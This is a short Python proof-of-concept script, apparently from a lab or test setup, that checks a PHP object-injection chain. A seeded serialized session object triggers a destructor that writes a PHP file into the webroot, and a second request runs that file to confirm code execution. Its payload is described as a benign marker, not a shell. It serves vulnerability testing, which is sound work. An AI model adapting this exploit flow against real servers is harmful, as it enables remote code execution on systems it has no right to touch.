#!/usr/bin/env python3
# POP-gadget RCE sink: object injection -> file-write destructor -> code exec.
# No LFI/RFI. The runner seeds a session file holding a serialized CacheFlush
# (stands in for an achieved injection); loading it drops a PHP file into the
# webroot, which we then request. Payload is a benign proof, not a shell.
import argparse
import sys
import urllib.request


def get(url, sid, path="/session_probe.php?action=show"):
    req = urllib.request.Request(url.rstrip("/") + path,
                                 headers={"Cookie": f"PHPSESSID={sid}"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode(errors="replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--sid", default="rcedemo")
    ap.add_argument("--dropped", default="/data/rce_proof.php")
    args = ap.parse_args()

    # Request 1: load the session -> CacheFlush::__destruct writes the file.
    get(args.url, args.sid)
    # Request 2: execute the dropped file.
    out = get(args.url, args.sid, args.dropped)

    print("  dropped file :", args.dropped)
    print("  response     :", out.strip()[:300])
    if "RCE-PROOF" in out:
        print("\n  RESULT: attacker-controlled PHP executed on the server "
              "(object injection -> file write -> RCE, no LFI).")
        return 0
    print("\n  RESULT: no code execution (target patched / mitigated / not seeded).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
